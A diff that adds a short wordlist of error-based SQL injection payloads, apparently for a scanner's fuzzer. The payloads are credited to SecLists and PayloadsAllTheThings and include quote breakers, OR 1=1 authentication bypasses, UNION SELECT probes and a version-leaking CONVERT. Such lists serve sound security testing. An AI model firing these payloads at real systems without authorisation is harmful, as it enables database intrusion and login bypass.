@@ -1,0 +1,20 @@
+# Error-based SQL injection payloads.
+# Derived from danielmiessler/SecLists (Fuzzing/SQLi) and
+# swisskyrepo/PayloadsAllTheThings (SQL Injection/) — both MIT.
+# Curated for an ERROR-BASED oracle (SQLite/Postgres/MySQL), not blind/time.
+# Each line is injected into one string path/query param at a time.
+'
+"
+`
+')
+")
+`)
+' OR '1'='1
+' OR 1=1--
+" OR "1"="1
+1' ORDER BY 1--
+1' UNION SELECT NULL--
+admin'--
+admin' #
+' AND 1=CONVERT(int,@@version)--
+1;SELECT 1
